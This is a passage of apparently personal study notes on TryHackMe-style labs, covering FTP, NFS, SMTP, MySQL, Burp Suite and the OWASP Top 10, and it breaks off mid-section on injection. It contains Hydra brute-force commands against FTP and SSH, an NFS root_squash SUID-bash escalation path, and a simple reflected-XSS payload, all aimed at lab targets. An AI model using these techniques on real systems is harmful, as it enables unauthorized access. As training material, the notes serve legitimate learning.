As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data. 

FTP operates using a client-server protocol.

- The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute commands on the FTP server.

##### Active vs. Passive

The FTP Server may support either active or passive connections, or both. 

- In an active FTP connection, the client opens a port and listens. The server is required to actively connect to it.
- In a passive FTP connection, the server opens a port and listens (passively) and the client connects to it.

> This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. 
> 	If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient or for either large file transfers, or slow internet connections.

### Enumerating FTP

##### Method

We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.

> This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

##### Resources

As we're going to be logging in to an FTP server, we will need to make sure an FTP client is installed on the system. There should be one installed by default in most Linux systems, such as Kali or ParrotOS. 

- You can test if there is one by typing `ftp` into the console. 
- If you're brought a prompt that says "`ftp>`", then you have a working FTP client on your system.
- If not, it's as simple as using `sudo apt install ftp` to install one.

### Exploiting FTP

> Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

##### Method Breakdown

From our enumeration stage, we know: 

- There is an FTP server running on this machine
- We have a possible username

Using this information, let's try and **bruteforce** the password of the FTP server.

##### Hydra

**Hydra** is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali.

The command we're going to use to find the passwords is this:

`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`

Breakdown:

| SECTION                  | FUNCTION                                                                             |
| ------------------------ | ------------------------------------------------------------------------------------ |
| `hydra`                  | runs the hydra tool                                                                  |
| `-t 4`                   | Number of parallel connections to the target                                         |
| `-l [user]`              | Points to the user who's account you're trying to compromise                         |
| `-P [path to directory]` | Points to the file containing the list of possible passwords                         |
| `-vV`                    | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| `[machine IP]`           | The IP address of the target machine                                                 |
| `ftp / protocol`         | Sets the protocol                                                                    |
# Network Services 2

### Understanding NFS

> NFS stands for **Network File System** and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server.
> 	The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

##### How Does NFS Work?

> We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively - however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC. 

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

- The file handle
- The name of the file to be accessed
- The user's, user ID
- The users group ID

These are used for determining access rights to the specified file. This is what controls user permissions, i.e. read and write of files. 

##### What Runs NFS?

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

> A computer running Windows Server can act as an NFS file server for other non-Windows client computers.
> 	Likewise, NFS allows a Windows-based computer running WIndows Server to access files stored on a non-Windows NFS server.

### Enumerating NFS

##### NFS Common

> It is important to have this package installed on any machine that uses NFS, either as a client or server. It includes programs such as: **lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs**

##### Mounting NFS Shares

> Your client's system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS shares to the mount point on your machine like so:

`sudo mount -t nfs IP:share /tmp/mount -nolock`

| TAG      | FUNCTION                                                                     |
| -------- | ---------------------------------------------------------------------------- |
| sudo     | run as root                                                                  |
| mount    | execute the mount command                                                    |
| -t nfs   | type of device to mount, then specifying that it's NFS                       |
| IP:share | The IP address of the NFS server, and the name of the share we wish to mount |
| -nolock  | Specifies not to use NLM locking                                             |

### Exploiting NFS

If you have a low-privilege shell on any machine and you that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it's configured.

##### What is root_squash?

> By default, on NFS shares- **Root Squashing** is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user "nfsnobody" when connected, which has the least local privileges. 
> 	Not what we want.
> 	However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

##### SUID

> So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

###### Method

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand.

We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task - and execute this executable to gain a root shell.

###### The Executable

Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. 

If you want to download the executable through the command line, be careful not to download the github page instead of the raw script. You can use `wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`.

Another method to overcome compatibility issues is to obtain the bash executable directly from the target machine.

With the key obtained in the previous task, we can use SCP with the command `scp -i key_name username@10.10.115.184:/bin/bash ~/Downloads/bash`

###### Mapped Out Pathway:

Step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:

NFS Access ->
	Gain Low Privilege Shell ->
		Upload Bash Executable to the NFS share ->
			Set SUID permissions Through NFS Due to Misconfigured Root Squash ->
				Login through SSH ->
					Execute SUID Bit Bash Executable ->
						ROOT ACCESS

### Understanding SMTP

> SMTP stands for Simple Mail Transfer Protocol. It is utilized to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. 
> 	Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

- It verifies who is sending emails through the SMTP server.
- It send the outgoing mail
- If the outgoing mail can't be delivered it sends the message back to the sender

Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.

##### Pop and IMAP

> POP, or **Post Office Protocol** and IMAP, **Internet Message Access Protocol** are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client.
> 	When IMAP will sync the current inbox, with new mail on the server, downloading anything new. 
> 	This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. 
> 		The POPIMAP server is responsible for fulfilling this process.

##### How Does SMTP Work?

Email delivery functions much the same as the physical mail delivery system. 

The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps - will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email, (letter) is picked up and sent to this server, which then directs it to the recipient.

We can map the journey of an email from your computer to the recipient's like this:

**User** ------> **SMTP Server** ------|
						  |
						  |
						  **Wider Internet**
						  |
						  |
**Recipient**<----**POP/IMAP Server**

1. The mail user agent, which is either your email client or an external program connects to the SMTP server of your domain, e.g. stmp.google.com. This initiates the SMTP handshake.
	1. This connection works over the SMTP port - which is usually 25. Once these connections have been made and validated, the SMTP session starts.
2. The process of sending mail can now begin. The client first submits the sender, and the recipients email address - the body of the email and any attachments, to the server.
3. The SMTP server then checks whether the domain name of the recipient and sender is the same.
4. The SMTP server of the sender will make a connection to the recipients SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available, the Email gets put into an SMTP queue.
5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognized. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.
6. The email will then show up in the recipient's inbox.

>This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown: https://computer.howstuffworks.com/e-mail-messaging/email3.htm

>Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here: https://www.afternerd.com/blog/smtp/

### Enumerating SMTP

##### Enumerating Server Details

> Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. 
> 	We're going to use the *smtp_version* module in MetaSploit to do this. 
> 	As the name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.

##### Enumerating Users from SMTP

> The SMTP service has two internal commands that allow the enumeration of users: **VRFY** (confirming the names of valid users) and **EXPN** (which reveals the actual address of user's aliases and lists of email). 
> 	Using these SMTP commands, we can reveal a list of valid users

We can do this manually, over telnet connection - however Metasploit comes to the rescue again, providing a handy module appropriately called *smtp_enum* that will do the legwork for us.

- Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.

##### Alternatives

It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.

> This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for **OSCP**.

### Exploiting SMTP

Okay, so at the end of our enumeration stage we have a few vital pieces of information

1. A user account name
2. The type of SMTP server and Operating System running. 

We know now from out port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using **Hydra**

##### Preparation

> It's advisable that you exit Metasploit to continue the exploitation of this section of the room.
> Secondly, it's useful to keep a note of the information you gathered during the enumeration stage, to aid in the exploitation phase.

##### Hydra

There is a wide array of customizability when it comes to using Hydra, and it allows for adaptive password attacks against many different services, including SSH. Hydra comes by default on both Parrot and Kali. 

**Hydra** uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the `/usr/share/wordlists` directory - if you'd like to browse and find a different wordlists to the widely used "rockyou.txt". 

Likewise it is recommended to check out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. (subdomain enumeration)

The syntax for the command we're going to use to find the passwords out is this:

`hydra -t -16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.255.101 ssh`

Let's break it down:

| SECTION                 | FUNCTION                                                                             |
| ----------------------- | ------------------------------------------------------------------------------------ |
| hydra                   | Runs the hydra tool                                                                  |
| -t 16                   | Number of parallel connections per target                                            |
| -l [user]               | Point to the user who's account you're trying to compromise                          |
| -P [path to dictionary] | Points to the file containing the list of possible passwords                         |
| -vV                     | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| [machine IP]            | The IP address of the targe machine                                                  |
| ssh / protocol          | sets the protocol                                                                    |
# Understanding MySQL

##### What is MySQL?

In its simplest definition, MySQL is a relational database management system (RDBMS) based on **Structured Query Language**. 

**Database**:

Simple a persistent, organized collection of structured data.

**RDBMS**

A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organized as tables.

- Every tables relates in some way to each other's "primary key" or other "key" factors

**SQL**:

MySQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how to the client and server communicate? They use a language, specifically the **Structured Query Language** (SQL)

Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilizing the Structured Query Language syntax.

**How does MySQL work?**

MySQL, as an RDBMS, is made up of the server and utility programs that help the administration of MySQL databases.

The server handles all database instructions like creating, editing and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:

1. MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2. Clients make requests by making specific statements in SQL.
3. The server will respond to the client with whatever information has been requested.

**What Runs MySQL?**

MySQL can run on various platforms, whether it's Linux or Windows. It is commonly used as a backend database for many prominent websites and forms an essential component of the LAMP stack, which included *Linux, Apache, MySQL and PHP*.

# Enumerating MySQL

> MySQL is likely not going to be the first point of call when getting initial information about a server. You can, as we have in the previous tasks, attempt to brute-force default account passwords if you really don't have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

##### The Scenario

Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the **credentials: "root:password**" while enumerating subdomains of a webserver. 

**Alternatives**

As with the previous task, it's worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as nmap's mysql-enum script: [https://nmap.org/nsedoc/scripts/mysql-enum.html](https://nmap.org/nsedoc/scripts/mysql-enum.html) or [https://www.exploit-db.com/exploits/23081](https://www.exploit-db.com/exploits/23081). I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.

# Exploiting MySQL

Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information that just database names. We know:

1. MySQL server credentials
2. The version of MySQL running
3. The number of databases, and their names

##### Key Terminologies

> In order to understand the exploits we're going to use next - we need to understand a few key terms:

**Schema**:

In MySQL, physically, a *schema* is synonymous with a *database*. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE.

It's important to understand this relationship because some other database products draw a distinction. 
- For example, in the Oracle Database product, a *schema* represents only a part of the database: the tables and other objects owned by a single user.

**Hashes**

Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.

In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. 
- This creates and index that is significantly smaller than the original data, allowing the values to be searched and accessed more effectively. 

However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format. 

# Burp Suite: The Basics

> Understand the basics of Burp Suite web application security testing framework. Focused on these key aspects:

- A thorough introduction to BurpSuite.
- A comprehensive overview of the various tools available within the framework.
- Detailed guidance on the process of installing Burp Suite on your system.
- Navigating and configuring BurpSuite.

### What is Burp Suite?

> A java-based framework designed to serve as a comprehensive solution for conducting web application penetration testing. It has become the industry standard tool for hands-on security assessments of web and mobile applications, including those that rely on **application programming interfaces**.

Simply put, Burp Suite captures and enables manipulation of all the HTTP/HTTPS traffic between a browser and web server. This fundamental capability forms the backbone of the framework. By intercepting requests, users have the flexibility to route them to various components within the Burp Suite framework, which we will explore in upcoming sections. 

- The ability to intercept, view and modify web requests before they reach the target server or even manipulate responses before they are received by our browser makes BurpSuite an invaluable tool for manual web application testing. 

> Burp Suite is available in different editions. For our purposes, we will focus on the BurpSuite Community Edition, which is completely free and accessible for non-commercial use within legal boundaries.

- However, it's worth noting that BurpSuite also offers Professional and Enterprise editions, which come with advanced features and require licensing. 

**BurpSuite Professional** comes with:

- Automated vulnerability scanner
- Fuzzer/Bruteforcer that isn't rate limited
- Saving projects
- Built-in API to allow integration with other tools
- Unrestricted access to add new extensions for greater functionality
- Access to BurpSuite collaborator

**Burp Suite Enterprise**, in contrast to the community and professional editions, is primarily utilized for continuous scanning. It features an automated scanner that periodically scans web applications for vulnerabilities, similar to how tools like Nessus perform automated infrastructure scanning. Unlike the other editions, which allow manual attacks from a local machine, Burp Suite Enterprise resides on a server and constantly scans the target web applications for potential vulnerabilities.

### Features of the Burp Community

> Although Burp Suite Community offers a more limited feature set compared to the Professional edition, it still provides an impressive array of tools that are highly valuable for web app testing:

- **Proxy**: The Burp Proxy is the most renowned aspect of Burp Suite. It enables interception and modification of requests and responses while interacting with web applications. 
- **Repeater**: Another well-known feature. Repeater allows for the capturing, modifying and resending the same request multiple times. This functionality is particularly useful when crafting payloads through trial and error (e.g. SQLi - Structured Query Language Injection) or testing the functionality of an endpoint for vulnerabilities. 
- **Intruder**: Despite rate limitations in BurpSuite Community, Intruder allows for spraying endpoints with requests. It is commonly utilized for brute-force attacks or fuzzing endpoints. 
- **Decoder**: Decoder offers a valuable service for data transformation. It can decode captured information or encode payloads before sending them to the target. While alternative services exist for this purpose, leveraging decoder within Burp Suite can be highly efficient. 
- **Comparer**: As the name suggests, Comparer enables the comparison of two pieces of data at either the word or byte level. While not exclusive to BurpSuite, the ability to send potentially large data segments directly to a comparison tool with a single keyboard shortcut significantly accelerates the process.
- **Sequencer**: Sequencer is typically employed when assessing the randomness of tokens, such as the session cookie values or other supposedly randomly generated data. If the algorithm used for generating these values lacks secure randomness, it can expose avenues for devastating attacks.

> Beyond the built-in features, the Java codebase of Burp Suite facilitates the development of extensions to enhance the framework's functionality. These extensions can be written in Java, Python (using the Java Jython interpreter) or Ruby (using the Java JRuby interpreter). The **BurpSuite Extender** module allows for quick and easy loading of extensions into the framework, while the marketplace, known as **BApp Store**, enables downloading of third party modules.

- While certain extensions may require a professional license for integration, there are still a considerable number of extensions available for the Burp Community. For instance, the **Logger++** module can extend the built in logging functionality of Burp Suite.

### The Dashboard

The Burp dashboard is divided into four quadrants, as labelled in the counter-clockwise order starting from the top left:

1. **Tasks**: Allows you to define background tasks that Burp Suite will perform while you use the application. The default "Live Passive Crawl" task, which automatically logs the pages visited, is sufficient for our purposes in this exercise. 
2. **Event Log**: Provides information about the actions performed by Burp Suite, such as starting the proxy, as well as details about connections made through Burp. 
3. **Issue Activity**: This section is specific to Burp Suite Professional. It displays the vulnerabilities identified by the automated scanner, ranked by severity and filterable based on the certainty of the vulnerability. 
4. **Advisory**: The advisory section provides more detailed information about the identified vulnerabilities, including references and suggested remediations. This information can be exported into a report. In Burp Suite Community, this section may not show any vulnerabilities. 

### Navigation

> the default navigation is primarily done through the top menu bars, which allow you to switch between modules and access various sub tabs within each module. The sub-tabs appear in a second menu bar directly below the main menu bar. 

1. **Module Selection**: the top row of the menu bar displays the available modules in Burp Suite. You can click on each module to switch between them.
2. **Sub-tabs**: If a selected module has multiple sub-tabs, they can be accessed through the second menu bar that appears directly below the main menu bar. These sub-tabs often contain module-specific settings and options.
3. **Detaching Tabs:** if you prefer to view multiple tabs separately, you can detach them into separate windows. To do this, go to the **Window** option in the application menu above the **Module Selection** bar. 
	1. From there, choose the detach option, and the selected tab will open in a separate window. The detached tabs can be reattached using the same method. 

> Keyboard shortcuts for quick navigation to key tabs, By default, the following shortcuts are available:

| Shortcut         | Tab          |
| ---------------- | ------------ |
| Crtl + Shift + D | Dashboard    |
| Ctrl + Shift + T | Target tab   |
| Crtl + Shift + P | Proxy tab    |
| Ctrl + Shift + I | Intruder tab |
| Ctrl + Shift + R | Repeater tab |
### Options

Before diving into the Burp Proxy, let's explore the available options for configuring Burp Suite. There are two types of settings: Global settings (also know as User settings) and Project settings. 

- **Global Settings**: These settings affect the entire Burp Suite installation and are applied every time you start the application. 
- **Project Settings**: These settings are specific to the current project and apply only during the session. However, please note that Burp Suite Community Edition does not support saving projects, so any project specific options will be lost when you close Burp. 

To access the settings, click on the **Settings** button in the top navigation bar. This will open a separate settings window. 

### Introduction to the Burp Proxy

> The Burp Proxy is a fundamental and crucial tool within Burp Suite. It enables the capture of requests and responses between the user and the target web server. This intercepted traffic can be manipulated, sent to other tools for further processing, or explicitly allowed to continue to it's destination.

##### Key Points to Understand about the Burp Proxy

- **Intercepting Requests**: When requests are made through the Burp Proxy, they are intercepted and held back from reaching the target server. 
	- The requests appear in the Proxy tab, allowing for further actions such as forwarding, dropping, editing or sending them to other Burp Proxies.
	- To disable the intercept and allow requests to pass through the proxy without interruption, click the `Intercept is on` button.
- **Taking Control**: The ability to intercept requests empowers testers to gain complete control over web traffic, making it invaluable for testing web applications. 
- **Capture and Logging**: Burp Suite captures and logs requests made through the proxy by default, even when the interception is turned off. This logging functionality can be helpful for later analysis and review of prior requests. 
- **WebSocket Support**: BurpSuite also captures and logs websocket communication, providing additional assistance when analyzing web applications.
- **Logs and History**: The captured requests can be viewed in the **HTTP History** and **WebSockets history** sub-tabs, allowing for retrospective analysis and sending the requests to other Burp modules as needed. 

##### Some Notable Features in the Proxy Settings

- **Response Interception**: By default, the proxy does not intercept server responses unless explicitly requested on a per-request basis. The "Intercept responses based on the following rules" checkbox, along with the defined rules, allows for a more flexible response interception. 
- **Match and Replace**: The "Match and Replace" section in the **Proxy settings** enables the use of regular expressions (regex) to modify incoming and outgoing requests. This feature allows for dynamic changes, such as modifying the user agent or manipulating cookies. 

### Site Map and Issue Definitions

The **target** tab in Burp Suite provides more than just control over the scope of our testing. It consists of three sub-tabs. 

1. **Site map**: This sub-tab allows us to map out the web applications we are targeting in a tree structure. Every page that we visit while proxy is active will be displayed on the site map. This feature enables us to automatically generate a site map by simply browsing the web application.
	1. In Burp Suite Professional, we can also use the site map to perform automated crawling of the target, exploring links between pages and mapping out as much of the site as possible. Even with BS Community, we can still utilize the site map to accumulate data during our initial enumeration steps. It is particularly useful for mapping our APIs, as any API endpoints accessed by the web application will be captured in the site map. 
2. **Issue Definitions**: Although Burp Community does not include the full vulnerability scanning functionality available in Burp Suite professional, we still have access to a list of all the vulnerabilities that the scanner looks for. The **Issue Definitions** section provides and extensive list of web vulnerabilities in reports or assisting in describing a particular vulnerability that may have been identified during manual testing. 
3. **Scope Settings**: This setting allows us to control the target scope in Burp Suite. It enables us to include or exclude specific domains/IPs to define the scope of our testing. By managing the scope, we can focus on the web applications we are specifically targeting and avoid capturing unnecessary traffic. 

### The Burp Suite Browser

> In addition to modifying our regular web browser to work with the proxy, Burp Suite also includes a built in Chromium browser that is pre-configured to use the proxy without any of the modifications we just had to do.

To start the Burp Browser, click the `Open Browser` button in the proxy tab. A chromium window will pop up, and any requests made in this browser will go through the proxy.

**Note:** There are many settings related to the Burp Browser in the project options and user options settings. Make sure to explore and customize them as needed.

However, if you are running Burp Suite on Linux as the root user (as is the case with the AttackBox), you may encounter an error preventing the Burp Browser from starting due to the inability to create a sandbox environment.

There are two simple solutions to this:

1. **Smart option:** Create a new user and run Burp Suite under a low-privilege account to allow the Burp Browser to run without issues.
2. **Easy option:** Go to `Settings -> Tools -> Burp's browser` and check the `Allow Burp's browser to run without a sandbox` option. Enabling this option will allow the browser to start without a sandbox. However, please be aware that this option is disabled by default for security reasons. If you choose to enable it, exercise caution, as compromising the browser could grant an attacker access to your entire machine. In the training environment of the AttackBox, this is unlikely to be a significant issue, but use it responsibly.

### Scoping and Targeting

**Scoping** is one of the most important aspects of using the Burp Proxy.

Capturing and logging all traffic can quickly become overwhelming and inconvenient, especially when we only want to focus on specific web applications. This is where scoping comes in.

By setting a scope for the project, we can define what gets proxied and logged in Burp Suite. We can restrict Burp Suite to target only the specific web applications we want to test. 

- The easiest way to do this is by switching to the `Target` tab, right-clicking on our target from the list on the left, and selecting `Add to Scope`. Burp will then prompt us to choose whether we want to stop logging anything that is not in scope, and in most cases, we want to select `yes.

> The scope settings window allows us to control our target scope by including or excluding domains/IPs. This selection s powerful and worth spending time getting familiar with. 

- However, even if we disabled logging for out-of-scope traffic, the proxy will still intercept everything. To prevent this, we need to go to the `Proxy settings` sub-tab and select `And` `URL` `Is in target scope` from the "Intercept Client Requests" section. 

- Enabling this option ensures that the proxy completely ignores any traffic that is no within the defined scope, resulting in a cleaner view of traffic in Burp Suite.

### Proxying HTTPS

When intercepting HTTP traffic, we may encounter an issue when navigating to sites with TLS enabled. For example, when accessing a site like `https://google.com/`, we may receive an error indicating that the PortSwigger Certificate Authority (CA) is not authorised to secure the connection. This happens because the browser does not trust the certificate presented by Burp Suite.

> To overcome this issues, we can manually add the PortSwigger CA certificate to our browser's list of trusted certificate authorities.

1. **Download the CA Certificate**: With the Burp Proxy activated, navigate to http://burt/cert. This will download a file called `dacert.der`. Save this file to your machine.
2. **Access Firefox Certificate Settings**: Type `about:preferences` into your Firefox URL bar and press **enter**. This will take you to the Firefox settings page. Find **View Certificates**.
3. **Import the CA Certificate**: In the Certificate Manager window, click on the import button. Select the `dacert.der` file that you downloaded in the previous step.
4. **Set Trust for the CA Certificate**: In the subsequent window that appears, check the box that says "Trust this CA to identify websites" and click OK.

### Example Attack

> We will start by looking at the support form at `http://10.10.145.127/ticket/`

In a real-world web app pentest, we would test this for a variety of things, one of which would be Cross-Site Scripting (XSS). If you have not encountered XSS, it can be thought of as injecting a client-side script (usually is JavaScript) into a webpage in such a way that it executes. 

There are various kinds of XSS - the type that we are using here is referred to as "Reflected" XSS, as it only affects the person making the web request.

##### Walkthrough

Try typing: `<script>alert("Succ3ssful XSS")</script>`, into the "Contact Email" field. You should find that there is a client-side filter in place which prevents you from adding any special characters that aren't allowed in email addresses.

Fortunately for us, client-side filters are absurdly easy to bypass. There are a variety of ways we could disable the script or just prevent it from loading in the first place. 

Let's focus on simply bypassing the filter for now.

First, make sure that your Burp Proxy is active and that intercept is on.

Now, enter some legitimate data into the support form. For example: "pentester@example.thm" as an email address, and "Test Attack" as a query.

Submit the form — the request should be intercepted by the proxy.

With the request captured in the proxy, we can now change the email field to be our very simple payload from above: `<script>alert("Succ3ssful XSS")</script>`. After pasting in the payload, we need to select it, then URL encode it with the `Ctrl + U` shortcut to make it safe to send. This process is shown in the GIF below:

# OWASP Top 10 - 2021

> This room breaks ach OWASP topic down and includes details on the vulnerabilities, how they occur, and how you can exploit them. You will put the theory into practice by completing supporting challenges.

1. **Broken Access Control**
2. **Cryptographic Failures**
3. **Injection**
4. **Insecure Design**
5. **Security Misconfiguration**
6. **Vulnerable and Outdated Components**
7. **Identification and Authentication Failures**
8. **Software and Data Integrity Failures**
9. **Security Logging & Monitoring Failures**
10. **Server-Side Request Forgery (SSRF)**

### Broken Access Control

> Websites have pages that are protected from regular visitors. 
> 	For example, only the site's admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are broken.

A regular visitor being able to access protected pages can lead to the following:

- Being able to view sensitive information from other users
- Accessing unauthorized functionality.

Simply put, *broken access control allows attackers to bypass authorization, allowing them to view sensitive data or perform tasks they aren't supposed to.*

For example, a [vulnerability was found in 2019](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/), where an attacker could get any single frame from a Youtube video marked as private. The researcher who found the vulnerability showed that he could ask for several frames and somewhat reconstruct the video. Since the expectation from a user when marking a video as private would be that nobody had access to it, this was indeed accepted as a broken access control vulnerability.

### Broken Access Control IDOR Challenge

**IDOR** or **Insecure Direct Object Reference** refers to an access control vulnerability where you can access resources you wouldn't normally be able to see. 

- This occurs when the programmer exposes a **Direct Object Reference**, which is just an identifier that refers to specific objects within the server. By object, we could mean a file, a user, a blank account in a banking application, or anything really.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like `https://bank.thm/account?id=1111111`. 

- On this page, we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong.

There is, however, a potentially huge problem here, anyone may be able to change the `id` parameter to something else like `222222`, and if the site is incorrectly configured, then would have access to someone else's bank account.

The application exposes a direct object reference through the `id` parameter in the URL, which points to specific accounts. Since the application isn't checking if the logged-in user owns the referenced account, an attacker can get sensitive information from other users because of the IDOR vulnerability. Notice that direct object references aren't the problem, but rather that the application doesn't validate if the logged-in user should have access to the requested account.

### Cryptographic Failures

> A **cryptographic failure** refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.

For example, a secure email application:

- When you are accessing your mail account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able t recover the content of your email addresses.
	- When we encrypt the network traffic between the client and server, we usually refer to this as **encrypting data in transit.**

- Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read their clients emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as **encrypting data at rest**. 

**Cryptographic failures** often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords.

At more complex levels, taking advantage of some cryptographic failures often involves techniques such as "Man in the Middle Attacks", whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place.)

- Of course, many examples are simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web server itself.

### Cryptographic Failures (Supporting Material 1)

The most common way to store a large amount of data in a format easily accessible from many locations is in a database. This is perfect for something like a web app, as many users may interact with the website at any time. 
- Database engines usually follow the Structured Query Language (SQL) syntax.

In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. 

- These are referred to **flat-file databases**, as they are stored as a single file on a computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. 

> As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website?)
> 	Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive data exposure, indeed.

### Cryptographic Failures (Supporting Material 2)

> When it comes to hash cracking, Kali comes pre-installed with various tools. If you know how to use these, then feel free to do so, they are outwith the scope of this material. 

Instead, we will use the online tool: https://crackstation.net/ . This website is extremely good at cracking weak password hashes. 

- For more complicated hashes, we would need more sophisticated tools, however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely. 

> Crackstation works using a massive wordlist. If the password is not in the wordlist, then Crackstation will not be able to break the hash.
### Injection

Injection flaws are very common in applications today. These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input. Some common examples include:

